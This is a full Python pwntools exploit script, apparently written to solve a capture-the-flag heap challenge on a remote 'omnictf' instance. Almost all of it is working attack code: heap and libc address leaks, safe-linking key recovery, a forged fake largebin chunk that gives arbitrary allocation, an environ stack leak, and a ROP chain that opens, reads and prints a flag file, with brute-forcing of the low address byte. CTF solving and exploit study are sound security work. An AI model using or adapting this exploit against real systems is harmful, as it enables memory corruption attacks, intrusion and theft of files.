#!/usr/bin/env python3
from pwn import *

import os
import re
import time

HOST = args.HOST or os.environ.get("HOST", "nullshi-c450fc09639a.inst.omnictf.com")
PORT = int(args.PORT or os.environ.get("PORT", "1337"))

elf = context.binary = ELF("./main_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-linux-x86-64.so.2", checksec=False)
libc.address = 0

context.arch = "amd64"
context.log_level = "debug" if args.DEBUG else "info"

MENU = b"\n1. alloc\n2. free\n3. view\n4. zero\n5. exit\n> "
PROMPT_TIMEOUT = float(args.TIMEOUT or os.environ.get("TIMEOUT", "10.0"))

FIRST_CHUNK_OFF = 0x2A0
SECOND_CHUNK_OFF = 0x2D0
UNSORTED_FD_OFF = 0x203B20
LD_BASE_FROM_LIBC = 0x21B000
LD_ENV_COPY_OFF = 0x392D0
ENVIRON_LEAK_PAD = 0x18

REQX = 0x410
REQZ = 0x420
CONTAINER_REQ = 0x900
FAKE_REQ = 0x400
EDIT_REQ = 0x3F0
FAKE_SIZE = 0x410
D_SIZE = 0x400

EXP_START_OFF = 0x920
STACK_ALLOC_RET_OFF = 0x150
STACK_TARGET_PAD = 8
READ_SZ = 0x100
REMOTE_FLAG_PATH = b"/home/ctf/flag.txt"
LOCAL_FLAG_PATH = b"flag.txt"
ROP_PATH_OFF = 0x120
ROP_BUF_OFF = 0x200

RET_OFF = 0x2882F
POP_RDI_OFF = 0x10F78B
POP_RSI_OFF = 0x110A7D
POP_RDX_4POP_OFF = 0x0B505C
XCHG_RDI_RAX_OFF = 0x19E3A1


def start():
    if args.REMOTE:
        last_error = None
        for _ in range(8):
            io = None
            try:
                io = remote(HOST, PORT, ssl=True, sni=HOST)
                banner = io.recvuntil(b"> ", timeout=3.0)
                if not banner.endswith(b"> "):
                    raise EOFError("missing menu")
                io.unrecv(banner)
                return io
            except Exception as exc:
                last_error = exc
                if io is not None:
                    io.close()
                time.sleep(0.2)
        raise RuntimeError(f"remote handshake failed: {last_error}")

    return process([ld.path, elf.path], env={"LD_LIBRARY_PATH": "."})


def recvuntil_exact(io, delim, timeout=None):
    got = io.recvuntil(delim, timeout=PROMPT_TIMEOUT if timeout is None else timeout)
    if not got.endswith(delim):
        tail = got[-80:] if got else b""
        raise TimeoutError(f"timeout waiting for {delim!r}; tail={tail!r}")
    return got


def current_flag_path():
    if args.PATH:
        path = args.PATH
        if isinstance(path, bytes):
            return path.rstrip(b"\x00") + b"\x00"
        return path.encode() + b"\x00"

    if args.REMOTE:
        return REMOTE_FLAG_PATH + b"\x00"

    return LOCAL_FLAG_PATH + b"\x00"


def send_menu_lines(io, *lines):
    recvuntil_exact(io, b"> ")
    payload = b"\n" + b"\n".join(
        line if isinstance(line, bytes) else str(line).encode() for line in lines
    ) + b"\n"
    io.send(payload)


def alloc(io, idx, size, data):
    if len(data) > size:
        raise ValueError(f"alloc payload too large: {len(data):#x} > {size:#x}")

    send_menu_lines(io, b"1", idx, size)
    recvuntil_exact(io, b"data: ")
    io.send(data)


def free(io, idx):
    send_menu_lines(io, b"2", idx)
    recvuntil_exact(io, b"idx: ")


def view(io, idx):
    send_menu_lines(io, b"3", idx)
    recvuntil_exact(io, b"idx: ")
    blob = recvuntil_exact(io, b"> ")
    io.unrecv(b"> ")

    marker = blob.find(MENU)
    if marker == -1:
        raise RuntimeError(f"failed to parse view output: {blob!r}")

    out = blob[:marker]
    if out.endswith(b"\n"):
        out = out[:-1]
    return out


def zero_abs(io, hbase, addr):
    if addr < hbase or (addr - hbase) % 8:
        raise ValueError(f"bad heap zero target: {addr:#x}")

    send_menu_lines(io, b"4", (addr - hbase) // 8)
    recvuntil_exact(io, b"idx: ")


def recover_heap_base(key_raw, fd_raw):
    key_tail = key_raw[1:]
    fd_tail = fd_raw[1:]
    candidates = []

    for low in range(256):
        key = low
        for i, byte in enumerate(key_tail, start=1):
            key |= byte << (i * 8)

        base = key << 12
        enc = (base + FIRST_CHUNK_OFF) ^ key

        if p64(key)[1 : 1 + len(key_tail)] != key_tail:
            continue
        if p64(enc)[1 : 1 + len(fd_tail)] != fd_tail:
            continue

        candidates.append(base)

    candidates = sorted(set(candidates))
    if len(candidates) != 1:
        raise RuntimeError(f"heap recovery ambiguous: {[hex(x) for x in candidates]}")

    return candidates[0]


def leak_heap(io):
    alloc(io, 0, 0x20, b"A")
    free(io, 0)

    alloc(io, 1, 0x20, b"K")
    key_raw = view(io, 1)

    alloc(io, 2, 0x20, b"B")
    free(io, 1)
    free(io, 2)

    alloc(io, 3, 0x20, b"F")
    fd_raw = view(io, 3)
    free(io, 3)

    return recover_heap_base(key_raw, fd_raw)


def leak_libc(io):
    alloc(io, 3, 0x500, b"A")
    alloc(io, 4, 0x100, b"B")
    free(io, 3)
    alloc(io, 5, 0x500, b" ")

    raw = view(io, 5)
    leak = u64(raw[:6].ljust(8, b"\x00"))
    return leak - UNSORTED_FD_OFF


def container_payload(c, xhdr):
    fake_off = 0x300
    d_off = 0x100
    e_off = 0x780

    fake = c + fake_off
    d = c + d_off
    e = c + e_off

    payload = bytearray(b"C" * CONTAINER_REQ)

    payload[fake_off + 0x00 : fake_off + 0x08] = p64(0)
    payload[fake_off + 0x08 : fake_off + 0x10] = p64(FAKE_SIZE | 1)
    payload[fake_off + 0x10 : fake_off + 0x18] = p64(fake)
    payload[fake_off + 0x18 : fake_off + 0x20] = p64(fake)
    payload[fake_off + 0x20 : fake_off + 0x28] = p64(xhdr)
    payload[fake_off + 0x28 : fake_off + 0x30] = p64(d)
    payload[fake_off + FAKE_SIZE : fake_off + FAKE_SIZE + 8] = p64(FAKE_SIZE)

    payload[d_off + 0x00 : d_off + 0x08] = p64(0)
    payload[d_off + 0x08 : d_off + 0x10] = p64(D_SIZE | 1)
    payload[d_off + 0x10 : d_off + 0x18] = p64(d)
    payload[d_off + 0x18 : d_off + 0x20] = p64(d)
    payload[d_off + 0x20 : d_off + 0x28] = p64(fake)
    payload[d_off + 0x28 : d_off + 0x30] = p64(e)
    payload[d_off + D_SIZE : d_off + D_SIZE + 8] = p64(D_SIZE)

    payload[e_off + 0x20 : e_off + 0x28] = p64(d)
    return bytes(payload)


def setup_fake_largebin(io, hbase):
    x = hbase + EXP_START_OFF
    xhdr = x - 0x10
    yhdr = xhdr + 0x840
    zhdr = xhdr + 0xC60
    chdr = xhdr + 0x1090
    c = chdr + 0x10
    d = c + 0x100
    fake = c + 0x300
    e = c + 0x780
    fhdr = xhdr + 0x19A0

    alloc(io, 7, REQX, b"X" * REQX)
    alloc(io, 8, REQX, b"G" * REQX)
    alloc(io, 9, REQX, p64(xhdr) + p64(0xDEAD) + b"Y" * (REQX - 0x10))
    alloc(io, 10, REQZ, b"Z" * REQZ)

    alloc(io, 11, CONTAINER_REQ, b"C" * CONTAINER_REQ)
    free(io, 11)
    alloc(io, 11, CONTAINER_REQ, container_payload(c, xhdr))

    alloc(
        io,
        12,
        0x40,
        p64(0x1111) + p64(xhdr) + p64(fake) + p64(0x4444) + b"F" * 0x20,
    )
    alloc(io, 13, 0x20, b"g" * 0x20)
    alloc(io, 1, FAKE_REQ, b"H" * FAKE_REQ)
    alloc(io, 6, FAKE_REQ, b"S" * FAKE_REQ)

    free(io, 7)
    free(io, 10)
    alloc(io, 14, 0x600, b"L" * 0x600)
    zero_abs(io, hbase, x + 0x10)
    free(io, 8)

    alloc(
        io,
        7,
        REQX,
        flat(fhdr, yhdr, zhdr, fake).ljust(REQX, b"P"),
    )
    alloc(io, 8, REQX, b"R" * REQX)
    alloc(io, 15, REQX, b"T" * REQX)

    p_payload = bytearray(b"Q" * FAKE_REQ)
    d_next_prev_rel = (d + D_SIZE) - (fake + 0x10)
    p_payload[d_next_prev_rel : d_next_prev_rel + 8] = p64(D_SIZE)
    alloc(io, 0, FAKE_REQ, bytes(p_payload))

    log.info(f"xhdr={xhdr:#x} zhdr={zhdr:#x} fake={fake:#x} d={d:#x} e={e:#x}")
    return {"fake": fake, "d": d}


def edit_d_payload(fake, d, target):
    payload = bytearray(b"D" * EDIT_REQ)
    rel = fake - (d + 0x10)
    encoded = target ^ (fake >> 12)

    payload[rel + 0x00 : rel + 0x08] = p64(0)
    payload[rel + 0x08 : rel + 0x10] = p64(FAKE_SIZE | 1)
    payload[rel + 0x10 : rel + 0x18] = p64(encoded)
    payload[rel + 0x18 : rel + 0x20] = p64(0)
    return bytes(payload)


def first_arbitrary_alloc(io, state, target, out_slot, data):
    fake = state["fake"]
    d = state["d"]

    free(io, 1)
    free(io, 0)
    alloc(io, 2, EDIT_REQ, edit_d_payload(fake, d, target))
    alloc(io, 0, FAKE_REQ, b"F")
    alloc(io, out_slot, FAKE_REQ, data)


def next_arbitrary_alloc(io, state, target, out_slot, data):
    fake = state["fake"]
    d = state["d"]

    free(io, 6)
    free(io, 0)
    free(io, 2)
    alloc(io, 2, EDIT_REQ, edit_d_payload(fake, d, target))
    alloc(io, 0, FAKE_REQ, b"F")
    alloc(io, out_slot, FAKE_REQ, data)


def build_rop(libc_base, stack_target):
    ret = libc_base + RET_OFF
    pop_rdi = libc_base + POP_RDI_OFF
    pop_rsi = libc_base + POP_RSI_OFF
    pop_rdx = libc_base + POP_RDX_4POP_OFF
    xchg_rdi_rax = libc_base + XCHG_RDI_RAX_OFF

    path_addr = stack_target + ROP_PATH_OFF
    buf_addr = stack_target + ROP_BUF_OFF

    chain = flat(
        ret,
        pop_rdi,
        path_addr,
        pop_rsi,
        0,
        libc_base + libc.symbols["open"],
        xchg_rdi_rax,
        pop_rsi,
        buf_addr,
        pop_rdx,
        READ_SZ,
        0,
        0,
        0,
        0,
        libc_base + libc.symbols["read"],
        pop_rdi,
        1,
        pop_rsi,
        buf_addr,
        pop_rdx,
        READ_SZ,
        0,
        0,
        0,
        0,
        libc_base + libc.symbols["write"],
        pop_rdi,
        0,
        libc_base + libc.symbols["_exit"],
    )

    payload = bytearray(b"A" * STACK_TARGET_PAD + chain)
    if len(payload) > ROP_PATH_OFF:
        raise RuntimeError(f"ROP chain too long: {len(payload):#x}")

    payload = payload.ljust(ROP_PATH_OFF, b"B")
    payload += current_flag_path()
    return bytes(payload)


def leak_stack_env(io, state, libc_base, low_byte):
    target = libc_base + libc.symbols["environ"] - ENVIRON_LEAK_PAD
    marker = b"M" * ENVIRON_LEAK_PAD
    data = marker if low_byte is None else marker + bytes([low_byte])

    first_arbitrary_alloc(io, state, target, 1, data)
    raw = view(io, 1)
    if len(raw) < ENVIRON_LEAK_PAD + 6:
        raise RuntimeError(f"short environ leak: {raw.hex()}")

    return u64(raw[ENVIRON_LEAK_PAD : ENVIRON_LEAK_PAD + 8].ljust(8, b"\x00"))


def exploit_once(low_byte=None):
    io = start()

    hbase = leak_heap(io)
    log.success(f"heap base = {hbase:#x}")

    libc_base = leak_libc(io)
    log.success(f"libc base = {libc_base:#x}")

    state = setup_fake_largebin(io, hbase)

    stack_env = leak_stack_env(io, state, libc_base, low_byte)
    low_desc = f"{low_byte:#x}" if low_byte is not None else "true"
    log.success(f"environ = {stack_env:#x} (low={stack_env & 0xff:#x}, source={low_desc})")

    stack_target = stack_env - STACK_ALLOC_RET_OFF - STACK_TARGET_PAD
    if stack_target & 0xF:
        raise RuntimeError(f"unaligned stack target: {stack_target:#x}")
    log.info(f"ROP write target = {stack_target:#x}")

    rop_payload = build_rop(libc_base, stack_target)
    next_arbitrary_alloc(io, state, stack_target, 3, rop_payload)

    data = io.recvrepeat(2.0)
    if data:
        match = re.search(rb"[A-Za-z0-9_]*CTF\{[^}\n]+\}", data, re.IGNORECASE)
        if match:
            print(match.group(0).decode("latin-1", errors="replace"))
        else:
            print(data.decode("latin-1", errors="replace").rstrip())
    else:
        log.warning("no flag output received")

    io.close()
    return data


def exploit():
    if args.LOW:
        lows = [int(args.LOW, 0)]
    elif args.BRUTE:
        lows = list(range(0x08, 0x100, 0x10))
    else:
        lows = [None]

    default_tries = str(len(lows))
    tries = int(args.TRIES if args.TRIES else os.environ.get("TRIES", default_tries))
    last_error = None

    for attempt in range(tries):
        low = lows[attempt % len(lows)]
        low_desc = "auto" if low is None else f"{low:#x}"
        log.info(f"attempt {attempt + 1}/{tries}, low byte candidate={low_desc}")
        try:
            data = exploit_once(low)
            if b"omni" in data.lower() or b"ctf" in data.lower() or b"{" in data:
                return
        except Exception as exc:
            last_error = exc
            log.warning(f"attempt failed: {type(exc).__name__}: {exc!r}")

    raise RuntimeError(f"all attempts failed; last error: {last_error}")


if __name__ == "__main__":
    exploit()
